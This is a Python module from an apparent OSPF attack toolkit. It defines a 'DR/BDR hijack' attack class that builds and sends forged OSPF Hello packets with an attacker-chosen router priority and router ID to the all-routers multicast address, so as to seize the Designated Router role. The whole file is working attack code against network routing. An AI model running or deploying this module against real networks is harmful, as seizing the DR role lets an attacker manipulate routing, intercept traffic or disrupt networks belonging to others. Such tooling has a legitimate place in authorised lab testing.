from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import HelloInjectionConfig
from ospf_attack.core.packet import build_hello_packet, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class DRBDRHijackAttack(BaseAttack):
    name = "dr-bdr-hijack"
    description = "注入高优先级 Hello 抢占 DR/BDR 角色"
    category = AttackCategory.ADJACENCY
    config: HelloInjectionConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)
        pkt = build_hello_packet(
            router_id=self.config.router_id,
            area_id=self.config.area_id,
            src_ip=src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            router_priority=self.config.router_priority,
            hello_interval=self.config.hello_interval,
            router_dead_interval=self.config.router_dead_interval,
        )
        ok = self._sender.send_raw(pkt)
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"DR 抢占: Priority={self.config.router_priority}, Router ID={self.config.router_id}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
